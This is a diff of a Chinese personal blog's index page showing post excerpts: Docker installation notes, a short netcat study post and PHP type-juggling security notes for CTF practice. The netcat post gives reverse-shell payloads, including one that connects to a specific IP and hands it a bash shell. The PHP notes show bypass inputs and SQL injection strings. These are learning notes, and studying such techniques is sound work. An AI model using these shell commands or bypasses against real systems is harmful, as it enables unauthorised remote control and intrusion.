-<li>docker run -p允许container外部主机访问container的端口<h2 id="ubuntu14的febootstrap没有-i命令"><a href="#ubuntu14的febootstrap没有-i命令" class="headerlink" title="ubuntu14的febootstrap没有-i命令"></a>ubuntu14的febootstrap没有-i命令</h2></li>
-</ul>
-<p>作者：泛原罪<br>链接：<a href="http://www.jianshu.com/p/adaa34795e64" target="_blank" rel="external">http://www.jianshu.com/p/adaa34795e64</a><br>來源：简书    </p>
-
-          
+          <h1 id="基础类"><a href="#基础类" class="headerlink" title="基础类"></a>基础类</h1><h2 id="查看docker信息"><a href="#查看docker信息" class="headerlink" title="查看docker信息"></a>查看docker信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># 查看docker版本</div><div class="line">docker version</div><div class="line"># 显示docker系统的信息</div><div class="line">docker info</div><div class="line"># 日志信息</div><div class="line">docker logs</div><div class="line"># 故障检查</div><div class="line">service  docker  status</div><div class="line"># 启动关闭docker</div><div class="line">sudo service docker start|stop</div></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/08/docke/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -668,53 +898,15 @@
 
       
         
-          
-            <h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备:"></a>安装前的准备:</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1:"></a>step1:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname -r //查看内核版本</div></pre></td></tr></table></figure>
-<p>Docker需要一个64位的安装，无论你的Debian版本。 此外，你的内核必须至少是3.10。 最新的3.10次要版本或更新的维护版本也是可以接受的  </p>
-<h3 id="step2"><a href="#step2" class="headerlink" title="step2:"></a>step2:</h3><p>对于Debian wheezy用户i必须提供反向端口，启用backports</p>
-<ul>
-<li>用任意编辑器打开/etc/apt/sources.list.d/backports.list文件，如果没有这个文件，就创建一个。</li>
-<li>删除现有所有条目后添加一条新的反向端口条目<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb http://http.debian.net/debian wheezy-backports main</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="step3"><a href="#step3" class="headerlink" title="step3:"></a>step3:</h3><p>更新软件包信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get update</div></pre></td></tr></table></figure></p>
-<p>更新存储库信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install apt-transport-https ca-certificates gnupg2</div></pre></td></tr></table></figure></p>
-<p>添加新的GPG key（这里可能会失败几次，提示从公钥服务器接受失败，多试几次就可以了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">## apt-key adv \</div><div class="line">  　　--keyserver hkp://ha.pool.sks-keyservers.net:80 \</div><div class="line">  　　--recv-keys 58118E89F3A912897C070ADBF76221572C52609D</div></pre></td></tr></table></figure></p>
-<p>用任意编辑器打开/etc/apt/sources.list.d/docker.list文件，如果不存在，就创建一个<br>删除现有的所有条目，并添加新的条目（我只列出wheezy添加的，其他版本的请自行到官网查看）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb https://apt.dockerproject.org/repo debian-wheezy main</div></pre></td></tr></table></figure></p>
-<p>更新apt存储库，并验证apt存储库是正确的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">## apt-get update</div><div class="line">## apt-cache policy docker-engine</div></pre></td></tr></table></figure></p>
-<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><ul>
-<li><p>1.更新apt存储库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get update</div></pre></td></tr></table></figure>
-</li>
-<li><p>2.安装Docker</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get install docker-engine</div></pre></td></tr></table></figure>
-</li>
-<li><p>3.启动Docker服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## service docker start</div></pre></td></tr></table></figure>
-</li>
-<li><p>4.更新Docker</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get upgrade docker-engine</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="卸载Docker"><a href="#卸载Docker" class="headerlink" title="卸载Docker"></a>卸载Docker</h2><ul>
-<li><p>卸载docker软件包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get purge docker-engine</div></pre></td></tr></table></figure>
-</li>
-<li><p>卸载docker所有程序包和依赖关系</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## apt-get autoremove --purge docker-engine</div></pre></td></tr></table></figure>
-</li>
-<li><p>如果要删除所有图像，容器和卷，请运行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## rm -rf /var/lib/docker</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h1 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h1><h2 id="CentOS7环境下安装Docker"><a href="#CentOS7环境下安装Docker" class="headerlink" title="CentOS7环境下安装Docker"></a>CentOS7环境下安装Docker</h2><h3 id="安装包的组成"><a href="#安装包的组成" class="headerlink" title="安装包的组成"></a>安装包的组成</h3><p>2014年7月7日，CentOS官方发布了首个CentOS7正式版。CentOS7的Linux内核升级到3.10.0，对Linux容器支持得到大大增强。</p>
-<p>在CentOS7的Extra仓库中，有Docker的发布版。这个发布版包含了docker的一个比较老的版本(0.11.1)。相信随着Docker稳定版本的逐步退出，CentOS7会升级源仓库中的docker版本。</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在CentOS7下可以直接从源仓库安装docker，命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo yum install docker</div></pre></td></tr></table></figure></p>
-<p>安装程序将docker程序安装到<code>/usr/bin</code>目录下，配置文件安装在<code>/etc/sysconfig/docker</code>。安装好docker之后，可以将docker加入到启动服务组中，命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo systemctl <span class="built_in">enable</span> docker.service</div></pre></td></tr></table></figure></p>
-<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>手动启动docker服务器，使用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo systemctl start docker.service</div></pre></td></tr></table></figure></p>
-<p>初次启动需要一些时间，启动好后，你可以使用docker命令管理和运行你的docker镜像和容器了。</p>
-
-          
+          <h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备:"></a>安装前的准备:</h2><h3 id="step1"><a href="#step1" class="headerlink" title="step1:"></a>step1:</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname -r //查看内核版本</div></pre></td></tr></table></figure>
+<p>Docker需要一个64位的安装，无论你的Debian版本。 此外，你的内核必须至少是3.10。 最新的3.10次要版本或更新的维护版本也是可以接受的<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/07/kali_docker/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -902,6 +1094,160 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/06/daily_1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Rainer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rainer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/06/daily_1/" itemprop="url">2017-11-3</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-06T22:59:37+08:00">
+                2017-11-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="nc学习"><a href="#nc学习" class="headerlink" title="nc学习"></a>nc学习</h1><ul>
+<li>自己vps上的监听命令:  </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443</div><div class="line">-l指定监听模式,  </div><div class="line">-p xxx指定监听的端口,上面以443为例</div></pre></td></tr></table></figure>
+<ul>
+<li>后门playload  </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash &lt;IP&gt; &lt;PORT&gt;</div><div class="line">nc -nv 138.197.214.134 443 -c bash</div></pre></td></tr></table></figure>
+<p>执行上述后,在<em>监听方</em>就可以执行任意命令<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/06/daily_1/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/06/2017_11_14/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1005,267 +1351,17 @@
 
       
         
-          
-            <ul>
+          <ul>
 <li>原文连接<a href="http://www.restran.net/2016/09/26/php-security-notes/" target="_blank" rel="external">http://www.restran.net/2016/09/26/php-security-notes/</a><br>copy用于方便查阅  <h1 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$_POST <span class="comment">// 获取 post 数据，是一个字典</span></div><div class="line">$_GET <span class="comment">// 获取 get 数据，是一个字典</span></div><div class="line">$_COOKIE <span class="comment">// 获取 cookie</span></div><div class="line">$_SESSION <span class="comment">// 获取 session</span></div><div class="line">$_FILE <span class="comment">// 获取上传的文件</span></div><div class="line">$_REQUEST <span class="comment">// 获取 $_GET，$_POST，$_COOKIE 中的数据</span></div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h1 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h1><p><strong>@</strong> 当其放置在一个php表达式前,该表达式可能产生的错误信息都被忽略</p>
-<h1 id="变量默认值"><a href="#变量默认值" class="headerlink" title="变量默认值"></a>变量默认值</h1><p>定义一个变量,如果不设置值,默认为0</p>
-<h1 id="GET和-POST"><a href="#GET和-POST" class="headerlink" title="$_GET和$_POST"></a><code>$_GET</code>和<code>$_POST</code></h1><p>如果在GET参数中设置<code>name[]=a</code>,那么<code>$_GET[&#39;name&#39;] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用<code>urldecode</code>。<br><code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST[&#39;user&#39;]</code> 得到的是 <code>[&#39;admin&#39;]</code> 是一个数组。  </p>
-<h1 id="内置函数的松散性"><a href="#内置函数的松散性" class="headerlink" title="内置函数的松散性"></a>内置函数的松散性</h1><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><blockquote>
-<p>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0。</p>
-</blockquote>
-<ul>
-<li>5.2 中是将两个参数先转换成string类型。</li>
-<li>5.3.3 以后，当比较数组和字符串的时候，返回是0。</li>
-<li>5.5 中如果参数不是string类型，直接return</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$array=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</div><div class="line"><span class="comment">// 数组跟字符串比较会返回 0</span></div><div class="line"><span class="comment">//这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等</span></div><div class="line">var_dump(strcmp($array, <span class="string">'abc'</span>));</div></pre></td></tr></table></figure>
-<h2 id="sha1-和-md5-函数"><a href="#sha1-和-md5-函数" class="headerlink" title="sha1 和 md5 函数"></a>sha1 和 md5 函数</h2><p>md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sha1([]) === <span class="keyword">false</span></div><div class="line">md5([]) === <span class="keyword">false</span></div></pre></td></tr></table></figure>
-<h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><p>当一个整形和一个其他类型行比较的时候，会先把其他类型 <code>intval</code> 再比较</p>
-<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval() 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var_dump(intval(<span class="string">'2'</span>)) <span class="comment">// 2</span></div><div class="line">var_dump(intval(<span class="string">'3abcd'</span>)) <span class="comment">// 3</span></div><div class="line">var_dump(intval(<span class="string">'abcd'</span>)) <span class="comment">// 0</span></div></pre></td></tr></table></figure>
-<p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union…</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(intval($a) &gt; <span class="number">1000</span>) &#123;</div><div class="line">    mysql_query(<span class="string">"select * from news where id="</span>.$a)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> is_numeric(<span class="number">233333</span>);       <span class="comment"># 1</span></div><div class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333'</span>);    <span class="comment"># 1</span></div><div class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x233333</span>);    <span class="comment"># 1</span></div><div class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'0x233333'</span>);   <span class="comment"># 1</span></div><div class="line"><span class="keyword">echo</span> is_numeric(<span class="string">'233333abc'</span>);  <span class="comment"># 0</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><p>in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">in_array(<span class="string">'b'</span>, <span class="keyword">array</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>);</div></pre></td></tr></table></figure></p>
-<p>这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，<code>typeid=1’ union select..</code> 也能通过 in_array 的验证<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (in_array($_GET(<span class="string">'typeid'</span>], <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))) &#123;</div><div class="line">    $sql=<span class="string">"select …. where typeid="</span>.$_GET[<span class="string">'typeid'</span>]<span class="string">";</span></div><div class="line"><span class="string">    echo $sql;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure></p>
-<h1 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h1><p>PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。<br>array_search 会使用’ctf’和array中的每个值作比较，而且intval(‘ctf’)==0.,<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(is_array(@$a[<span class="string">"a2"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($a[<span class="string">"a2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"a2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        $pos = array_search(<span class="string">"ctf"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($a[<span class="string">"a2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"ctf"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2=<span class="number">1</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<h2 id="和"><a href="#和" class="headerlink" title="==和==="></a>==和===</h2><ul>
-<li><code>==</code>是弱类型的比较</li>
-<li><code>===</code>比较符则可以避免这种,隐式转换,除了检查值还检查类型<br>以下比较的结果都为 true<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span></div><div class="line"><span class="comment">// 十六进制与整数，被转换为同一进制比较</span></div><div class="line"><span class="string">'0xccccccccc'</span> == <span class="string">'54975581388'</span></div><div class="line"></div><div class="line"><span class="comment">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span></div><div class="line"><span class="number">1</span> == <span class="string">'1'</span></div><div class="line"><span class="number">1</span> == <span class="string">'01'</span></div><div class="line"><span class="number">10</span> == <span class="string">'1e1'</span></div><div class="line"><span class="number">100</span> == <span class="string">'1e2'</span></div><div class="line"><span class="number">0</span> == <span class="string">'a'</span> <span class="comment">// a 转换为数字为 0</span></div><div class="line"></div><div class="line"><span class="comment">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span></div><div class="line"><span class="string">'0xABCdef'</span> == <span class="string">'     0xABCdef'</span></div><div class="line"><span class="string">'0010e2'</span> == <span class="string">'1e3'</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="hash-比较的问题-hash碰撞"><a href="#hash-比较的问题-hash碰撞" class="headerlink" title="hash 比较的问题 hash碰撞"></a>hash 比较的问题 hash碰撞</h2><p>0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// '0e5093234' 为 0，'0eabc3234' 不为 0</span></div><div class="line"></div><div class="line"><span class="comment">// true</span></div><div class="line"><span class="string">'0e509367213418206700842008763514'</span> == <span class="string">'0e481036490867661113260034900752'</span></div><div class="line"><span class="comment">// true</span></div><div class="line"><span class="string">'0e481036490867661113260034900752'</span> == <span class="string">'0'</span></div><div class="line"></div><div class="line"><span class="comment">// false</span></div><div class="line">var_dump(<span class="string">'0'</span> == <span class="string">'0e1abcd'</span>);</div><div class="line"><span class="comment">// true</span></div><div class="line">var_dump(<span class="number">0</span> == <span class="string">'0e1abcd'</span>);</div><div class="line"></div><div class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">var_dump(md5(<span class="string">'aabg7XSs'</span>) == md5(<span class="string">'aabC9RqS'</span>));</div><div class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</div><div class="line">var_dump(sha1(<span class="string">'aaO8zKZF'</span>) == sha1(<span class="string">'aa3OFF9m'</span>));</div></pre></td></tr></table></figure></p>
-<p>如果要找出 <code>0e</code>开头的 hash 碰撞，可以用如下代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$salt = <span class="string">'vunp'</span>;</div><div class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</div><div class="line"></div><div class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</div><div class="line">    <span class="keyword">if</span> (md5($salt . $i) == $hash) &#123;</div><div class="line">        <span class="keyword">echo</span> $i;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">'  done'</span>;</div></pre></td></tr></table></figure></p>
-<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int<br>类型。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$i =<span class="string">"2abc"</span>;</div><div class="line"><span class="keyword">switch</span> ($i)  &#123;</div><div class="line">    <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">    <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">    <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">        <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">        <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。</p>
-<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="preg-matc"><a href="#preg-matc" class="headerlink" title="preg_matc"></a>preg_matc</h2><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(<code>^</code>和 <code>$</code>)，则可以存在绕过的问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ip = <span class="string">'1.1.1.1 abcd'</span>; <span class="comment">// 可以绕过</span></div><div class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,$ip)) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  <span class="comment">// echo('key...')</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="ereg-00-截断"><a href="#ereg-00-截断" class="headerlink" title="ereg %00 截断"></a>ereg %00 截断</h2><p>ereg 读到 %00 的时候，就截止了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z]+$"</span>, $_GET[<span class="string">'a'</span>]) === <span class="keyword">FALSE</span>)  &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'You password must be alphabet'</span>;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>这里 <code>a=abcd%001234</code>，可以绕过</p>
-<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">    $auth = <span class="string">'0'</span>;  </div><div class="line">    <span class="comment">// 这里可以覆盖$auth的变量值</span></div><div class="line">    extract($_GET);</div><div class="line">    <span class="keyword">if</span>($auth == <span class="number">1</span>)&#123;  </div><div class="line">        <span class="keyword">echo</span> <span class="string">"private!"</span>;  </div><div class="line">    &#125; <span class="keyword">else</span>&#123;  </div><div class="line">        <span class="keyword">echo</span> <span class="string">"public!"</span>;  </div><div class="line">    &#125;  </div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="comment">//GET举例 playload:?gift=flag&amp;flag=php://input</span></div><div class="line"><span class="meta">&lt;?php</span>     </div><div class="line">$flag=<span class="string">'mail.txt'</span>;     </div><div class="line">extract($_GET);     <span class="comment">// 这里可以覆盖</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($gift))</div><div class="line">&#123;        </div><div class="line">	$content=trim(file_get_contents($flag));</div><div class="line">	<span class="keyword">echo</span> $content;</div><div class="line">    <span class="keyword">if</span>($gift==$content)&#123;</div><div class="line">		<span class="keyword">echo</span><span class="string">'flag'</span>;     